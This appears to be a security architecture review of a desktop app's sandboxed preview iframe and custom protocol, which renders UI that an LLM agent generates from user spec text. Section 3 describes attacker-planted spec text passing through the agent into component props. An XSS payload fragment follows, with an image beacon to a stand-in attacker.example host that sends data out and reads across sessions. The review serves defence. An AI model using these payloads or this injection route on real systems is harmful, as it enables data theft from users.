# Security Review — Design Studio Preview Isolation (AD-5)

## Sources read

## 1. Is AD-5's mechanism sound for dynamically generated content?

**The sandbox posture itself is sound and is the right inheritance from `HtmlPreview.tsx`.** `sandbox="allow-scripts"` with no `allow-same-origin` gives the frame an opaque origin: no `window.parent`, no cookies, no filesystem, and (per the existing `HtmlPreview.tsx` comment) no top-navigation hijack. Moving from `srcDoc` to a real `src="hive-studio://…"` navigation is also the right fix for the known asset/base-URL limitation, and is consistent with how `hive-model:` already solves an analogous "serve local content same-origin to a sandboxed/restricted context" problem.

**But `HtmlPreview.tsx`'s threat model quietly does not include network egress, and AD-5 imports the mechanism without importing that omission's consequences.** Sandbox flags (`allow-scripts`, `allow-forms`, `allow-modals`, `allow-popups`, `allow-same-origin`, `allow-top-navigation`, …) govern DOM/navigation/storage capabilities. **None of them restrict outbound `fetch`/`XHR`/`<img src>`/`WebSocket` to third-party origins.** The only thing that can restrict that is CSP (`connect-src`, `img-src`, …), applied *to the document being loaded*. `HtmlPreview.tsx` never needed this because its content is a static file the user already put in their own workspace (lower trust requirement — see addendum.md's own framing: "diferente do preview de HTML estático hoje... aqui é regenerado repetidamente por um agente"). Design Studio's content is explicitly the higher-trust-requirement case, and AD-5 does not add the one control that actually matters for it.

Concretely, I found **no CSP-issuing mechanism anywhere in the codebase that would apply to a document served by a custom protocol.** The only CSP in the app is the single `<meta http-equiv="Content-Security-Policy">` in `hive-desktop/src/renderer/index.html`, which governs the *top-level* renderer document only. A cross-document navigation (`<iframe src="hive-studio://…">`) to a distinct scheme/origin does **not** inherit that policy — CSP inheritance in the spec only applies to same-origin "local scheme" documents (`about:blank`, `srcdoc`, `data:`), which AD-5 explicitly is not using. `protocol.handle` in `whisperProtocol.ts` never sets a `Content-Security-Policy` response header because it only ever serves binary/JSON model bytes consumed by `fetch()`, never an HTML document that itself needs a policy. AD-5's rule ("The CSP `<meta>` tag must be extended per-directive... at minimum `frame-src`/`default-src`; also `img-src`/`style-src`/`script-src` as the DS bundle needs") reads as extending the *top-level app's* `<meta>` tag — which is necessary (the parent needs `frame-src hive-studio:` to be allowed to embed the iframe at all) but is **not the same thing** as giving the `hive-studio://` document its own CSP. Unless `previewProtocol.ts` explicitly attaches a `Content-Security-Policy` response header (the same way `whisperFileHeaders` attaches `content-length`) or the generated HTML shell embeds its own `<meta>` CSP tag, **the served document has no CSP at all** — full `script-src *`, `connect-src *`, inline scripts, `eval`, everything, bounded only by the sandbox flags (which, again, don't cover network).

**On `corsEnabled: true` / `supportFetchAPI: true` specifically:** for `hive-model:`, this is low-risk — the served bytes are fixed, non-secret, identical for every caller and every session (Whisper model weights). Turning it on for `hive-studio://` changes the risk in three ways a static-asset protocol doesn't have:

1. It's what makes the sandboxed iframe's *own* opaque-origin `fetch()` calls to `hive-studio://` succeed at all (Chromium refuses cross-origin fetch to a non-CORS-enabled scheme, same reason whisper needed it). That's required and fine.
2. It also means **any other document running inside this app** (any other open tab/webContents, or — if question 2's gap is real — a script now executing inside the very iframe under review) can issue a `fetch('hive-studio://<anything>')` and have Chromium hand back the response, because CORS-enabled schemes don't do per-caller authorization; `protocol.handle` sees a URL and must do 100% of the access-control decision itself. `whisperProtocol.ts` gets away with a bare `roots['models']` lookup because there is only one non-secret root. `previewProtocol.ts` cannot get away with the same simplicity — see §3 below.
3. Because it's `supportFetchAPI: true` and `standard: true`, this is a live, repeatable read channel, not a one-shot navigation. If §2's rendering gap is real, an in-frame script gets an unrestricted way to pull *more* `hive-studio://` content (other Telas, chat transcript, other sessions) and — because of §1's missing CSP — an unrestricted way to ship whatever it read to an external server.

**Verdict for Q1:** the sandbox choice is correct; the protocol-vs-srcDoc choice is correct and necessary for assets; but AD-5 as worded does not actually deliver "isolated" for this threat model, because it never specifies a CSP for the served document and never specifies request-level authorization for the corsEnabled protocol. Both are silent, both are exploitable, and neither existed as a problem in the precedents AD-5 cites (because neither precedent served attacker-influenceable, session-scoped HTML).

## 2. Does the spine adequately constrain how Commands become DOM, or is `renderToDom` a silent gap?

**This is a silent gap, and the spine's own text hints at which way it will go by default.**

AD-3 correctly closes the *structural* injection route: "Markup is never accepted as a Skill response" — the Skill can't get a raw `<script>` tag accepted as a "component" because `AddComponent` only takes components that exist in `DesignSystemAdapter.catalog()`. AD-10 closes the *shape* route: a `SetProp` naming a prop the catalog doesn't recognize for that component is rejected as a `CapabilityViolation`. Both are real, load-bearing controls and both work as designed.

**Neither constrains the *value* of a prop that *is* in the catalog.** A `wa-button`'s `label` prop, a card's `text`/`caption`, an `aria-label`, an `href` — these are exactly the string-typed, freely-editable props a design-system catalog is full of, and exactly what a Spec-de-UX-derived prose string would naturally land in via FR-2's generation. AD-10's `CapabilityViolation` fires on "is this prop/component known," not on "does this string contain markup." Nothing in AD-2/AD-3/AD-4/AD-10 requires value-level escaping/sanitization at the point a `Command`'s string payload is turned into DOM.

Whether that gap is exploitable is **entirely a function of how `renderToDom()` is implemented**, and the spine does not pin that down:

- **Safe shape:** `renderToDom` builds real elements via `document.createElement(tag)` + `el.setAttribute(name, value)` / `el.someProp = value` (or, since the DS is Lit-based, via Lit's own `html\`...\`` tagged templates using ordinary `${value}` bindings, which Lit auto-escapes). A malicious string in a `label` prop just renders as inert text.
- **Unsafe shape:** `renderToDom` (or whatever runs inside the iframe to apply live updates without a full reload — see below) concatenates an HTML string from `Command`/`Document` data and assigns it via `innerHTML`/`outerHTML`/`document.write`. A malicious string in a `label` prop becomes live markup, and — since `allow-scripts` is already granted — an `<img src=x onerror=…>` or similar fires **without any user interaction**, immediately on render, on every regeneration.

The spine's own artifacts point toward the unsafe shape by name: AD-4 calls the Preview method `renderToDom()` (DOM-tree-shaped, reassuring), but the sequence diagram two sections later has `DS-->>Host: markup do DS ativo` — "markup," i.e., a string. AD-6's Export method is explicitly `renderToStaticHtml()` (a string, correctly, since Export's whole job is producing an HTML file) — if Preview and Export are meant to share a code path per AD-6's spirit ("no second HTML generator"), the natural implementation temptation is to have `renderToDom` be a thin wrapper that calls the same string-producing renderer as Export and then `innerHTML`s the result into the iframe for convenience. That would directly defeat the sandbox's value for exactly the injected-string case above, while still technically satisfying every rule currently written (AD-2, AD-3, AD-4, AD-6, AD-10 as worded neither require nor forbid it).

There's a second, related gap: **AD-5 never specifies the live-update transport.** FR-8 requires edits to reflect "instantaneous[ly]... sem reload completo da Tela," but AD-5 pins the iframe to `src="hive-studio://…"` and explicitly rules out `srcDoc`. A same-document `src` reload on every keystroke/command would both violate FR-8 (visible reload/flash, loses in-frame scroll/focus state) and be wasteful. The only realistic way to get instant, no-reload updates into a cross-origin sandboxed frame is `postMessage` (which sandboxed frames can still send/receive) carrying the new `Document`/`Command` state, with an in-page script — shipped as part of "the DS Adapter's packaged web-component bundle" the protocol serves — applying it to the live DOM. If that's the actual mechanism (the spine doesn't say, but it's the only mechanism that satisfies FR-8 + AD-5's stated constraints simultaneously), then **the DS Adapter's rendering code runs inside the untrusted-but-sandboxed iframe itself**, receiving `Command`/prop values sourced from agent output via `postMessage`. That's a legitimate design (keeps main-process round-trips out of the hot path), but it means the safe-DOM-composition requirement above applies to code that ships *inside* the iframe bundle, and a permissive `window.addEventListener('message', e => root.innerHTML = e.data.html)` on the receiving end is the single line that would silently defeat everything AD-5 sets up. None of this is written down anywhere in the spine.

**Verdict for Q2:** real, concrete, currently-silent gap. AD-4/AD-5 constrain *where* rendering may happen (behind the adapter, inside the sandbox) but not *how* a prop value becomes DOM, and the spine's own naming (`renderToDom` vs. "markup do DS ativo") is internally inconsistent about which shape is intended — which is itself evidence this was never decided, only assumed.

## 3. Concrete attack scenario specific to "LLM agent, attacker-influenced Spec de UX text, privileged same-origin protocol"

**Primary chain (ties Q1 + Q2 together):**

1. An attacker plants text inside a Spec de UX markdown file the victim will open in Design Studio — e.g. a pasted requirements doc, a copied ticket description, or content from an external source the BMad UX flow ingested. Nothing about `bmad-ux`'s output format prevents arbitrary prose from ending up as literal component copy (FR-2's whole point is interpreting "prosa/estrutura... sem exigir mudança no formato de saída do bmad-ux").
2. The Skill de Design System (an LLM, per AD-9 routed through the generic `AgentAdapter`) faithfully carries that text into a `SetProp` command on a legitimate, catalog-valid prop — e.g., a card's `caption` or a button's `label` — because from the Skill's point of view it's just doing its job: reflecting the spec's copy into the UI. This requires no prompt-injection "jailbreak" of the Skill at all; a passthrough of literal spec text into a text-bearing prop is the *expected*, correct behavior of FR-2, which is exactly why AD-3's "no raw markup" defense doesn't help here — the payload never claims to be markup, it claims to be a caption.
3. `screenDocument.ts` applies the command; nothing in AD-2/AD-3/AD-10 rejects it (real component, real prop, string value — passes catalog validation).
4. If `renderToDom` (main-process- or in-iframe-executed, per §2) composes the value into the DOM unsafely, the payload executes as script inside the sandboxed iframe the moment the Tela renders — no click required, happens again on every session reopen/regeneration.
5. Because (per §1) the `hive-studio://` document has no CSP restricting `connect-src`/`img-src`, and because sandbox flags don't restrict egress, the executing script (or even a bare `<img src="https://attacker.example/beacon?d=…">`) can exfiltrate anything reachable in that frame — the rendered Tela's own content, which may echo confidential product/business text from the Spec de UX, plus (per the `corsEnabled` point in §1.2) potentially other `hive-studio://` resources it can also read (see next scenario) — to an attacker-controlled server, entirely outside the app's own trust boundary. This requires no `allow-same-origin`, no filesystem access, no cookie theft — the sandbox's actual guarantees are never violated; the attack lives entirely in the gap those guarantees don't cover.

**Secondary chain (cross-session confidentiality, specific to `corsEnabled` + multi-session):** AD-1 keeps one Design Studio session per tab, and multiple tabs can plausibly be open at once (one per Spec de UX). AD-7 keys session storage by `(specPathHash, workspaceHash)` — a value derived from data on disk, not a secret. If `previewProtocol.ts`'s host/path scheme for `hive-studio://` is built the same way (a deterministic hash rather than an unguessable per-session capability token, mirroring how `whisperProtocol.ts`'s `roots` map uses a fixed, non-secret key like `models`), then step 4 above doesn't need to stop at the current Tela's own resource: a script executing in *one* session's sandboxed iframe can `fetch('hive-studio://<other-session-hash>/…')` and read a *different* Spec de UX's generated Tela/session state — because `corsEnabled: true` means the browser will hand back that response to any caller inside the app, and `protocol.handle` is the only place that could refuse it, if it's written to. This turns a single successful injection in one (perhaps low-sensitivity, test) session into a read primitive across every Design Studio session the user has ever opened, including ones with more sensitive content. Nothing in AD-5 or AD-7 specifies that `previewProtocol.ts` must authenticate a request against the session the requesting frame actually belongs to.

**Tertiary, lower-probability but worth naming:** `previewProtocol.ts` is described as serving both a static packaged bundle and "a per-session generated HTML shell." If the per-session shell is resolved from a request path the same way `resolveWhisperRequest` resolves model paths, it needs the *same* traversal guard (`resolveWhisperRequest`'s two-layer `../` and `%2e%2e` defense) — AD-5's text says the registration "mirrors `whisperProtocol.ts`'s registration," which reads as covering the `protocol.registerSchemesAsPrivileged` privilege object, not necessarily the resolver's path-escape logic. Worth making explicit rather than assuming it's inherited.

## 4. Is "Deferred / carried as PRD assumption" appropriate, or does the spine need another AD?

**Not appropriate as currently scoped.** The PRD is explicit that this exact question — "is iframe-sandbox isolation sufficient for repeatedly-agent-regenerated content, or does this need a deeper review" (§11 Q2) — was left open *specifically for the architecture phase to answer*, and PRD §8 states plainly: "uma revisão de segurança dedicada deve confirmar isso na fase de arquitetura." The current Deferred entry restates the question back ("carregado como assunção desta spine... não decide se é suficiente") rather than answering it. That's a reasonable thing to defer *if* the answer were "yes, sandbox+protocol is sufficient, full stop" — but this review finds concrete, specific, non-hypothetical gaps (missing CSP for the served document; unconstrained value-to-DOM composition; no session-scoping story for a corsEnabled protocol) that sit squarely inside AD-5's own mechanism, not in some deeper defense-in-depth layer (worker isolation, separate process, etc.) that would genuinely be a "how much is enough" judgment call appropriate to defer.

These three gaps are all closeable at the same altitude as the rest of this spine — they're architecture-level rules (what CSP the response must carry, what API class `renderToDom` must use, what identity a `hive-studio://` request must carry), not implementation trivia. Recommend the spine gain (as an amendment to AD-5, or a new AD-11) rules along these lines before this is implementation-ready:

1. **CSP on the served document, not just the parent shell.** `previewProtocol.ts`'s response for the HTML shell must carry its own restrictive `Content-Security-Policy` (response header or embedded `<meta>`) — at minimum a locked `connect-src`/`img-src`/`form-action` that does not include any external scheme, so a rendering-layer injection (finding 2) cannot phone home even if it fires. `script-src`/`style-src` should be scoped to `'self' hive-studio:` only (no `unsafe-inline`, no remote origins), matching the "packaged, not CDN-loaded" DS bundle decision addendum.md already made.
2. **A named, closed rendering API for `renderToDom`.** State explicitly that Command→DOM composition uses imperative safe APIs (`createElement`/`setAttribute`/property assignment) or Lit's own auto-escaping template bindings, and explicitly forbids building an HTML string from `Command`/prop data and assigning it via `innerHTML`/`outerHTML`/`document.write` anywhere in the Preview path — even though `renderToStaticHtml()` (Export) legitimately produces a string, that string must never be round-tripped back into the live Preview DOM.
3. **Per-session request authorization for `hive-studio://`.** Specify that `previewProtocol.ts` validates each request against an unguessable, per-session-issued value (not a deterministic hash of workspace/spec path), the way `resolveWhisperRequest` validates a host but stronger — since here, unlike the single non-secret `models` root, different hosts/paths correspond to different users' potentially sensitive sessions.
4. **State where/how live updates reach the iframe without a full `src` reload**, and confirm the same value-safety rule from point 2 applies there too — this is currently unspecified and the natural implementation (`postMessage` into an in-frame renderer) needs to inherit point 2's constraint explicitly, since it's easy to satisfy "AD-5 says the iframe loads via `src=`, not `srcDoc`" while still having an in-frame `message` handler that does the unsafe thing on every update after the initial load.

None of these require inventing new isolation tiers (separate process, worker, remote sandbox) — the PRD's "isso é suficiente ou pede algo mais profundo" framing suggested that might be the open question, but on this review the sandboxed-iframe-plus-custom-protocol mechanism is the right tier; it just needs these four rules to actually deliver the isolation AD-5 claims rather than silently relying on defaults that don't hold for this content type.

## Findings summary

| # | Severity | Finding |
|---|----------|---------|
| F1 | **High** | No CSP is specified for the document `hive-studio://` serves. Cross-scheme `src` navigation does not inherit the top-level app's CSP `<meta>` tag (that only covers `about:blank`/`srcdoc`/`data:`-style inheritance). Absent an explicit header/`<meta>` from `previewProtocol.ts`, the served document has no `connect-src`/`script-src` restriction at all, and sandbox flags (`allow-scripts` etc.) do not restrict outbound network — so any script execution inside the sandbox has an open exfiltration channel to arbitrary external hosts. |
| F2 | **High** | `Command`→DOM value composition is unconstrained. AD-3/AD-10 stop structural injection (raw markup, unknown props) but not value-level injection through legitimate string props (label/caption/aria-label/href/…) — exactly what agent-generated text from Spec de UX content would naturally populate. The spine's own sequence diagram labels the Preview path's output "markup" (string-shaped), which is the unsafe `innerHTML` shape if implemented literally; AD-4's `renderToDom` naming suggests the opposite (safe DOM-tree shape). This inconsistency is unresolved. |
| F3 | **Medium-High** | `corsEnabled: true`/`supportFetchAPI: true` on `hive-studio://` (necessary for the sandboxed iframe's own fetches to succeed) also means any document in the app — including a compromised preview frame — can fetch any `hive-studio://` URL it can construct, with `protocol.handle` as the *only* access-control point. No session-scoping/authorization rule is specified; if URLs are built from deterministic hashes (as AD-7 does for session-store keys) rather than unguessable per-session tokens, one compromised session can read another session's private content. |
| F4 | **Medium** | AD-5 pins the iframe to a real `src="hive-studio://…"` navigation (never `srcDoc`), but FR-8 requires instant, no-full-reload updates — the only mechanism that reconciles both is almost certainly `postMessage` into an in-frame renderer, which the spine never names. Wherever that renderer's code lives, F2's safe-composition rule must apply to it too, and currently nothing says so. |
| F5 | **Low-Medium** | Unclear whether `previewProtocol.ts` inherits `resolveWhisperRequest`'s path-traversal guard (percent-encoded `../`, root-escape check) for resolving the "per-session generated HTML shell," or only the scheme-privilege registration. Worth making explicit rather than assumed. |
| F6 | **Process** | PRD §8 explicitly calls for a "revisão de segurança dedicada" at the architecture phase; the current Deferred entry defers the *conclusion* of that review rather than delivering it. Given F1–F3 are concrete and closeable at this altitude, "Deferred" is premature — recommend resolving via an AD-5 amendment or new AD before implementation starts, not carrying it further downstream. |
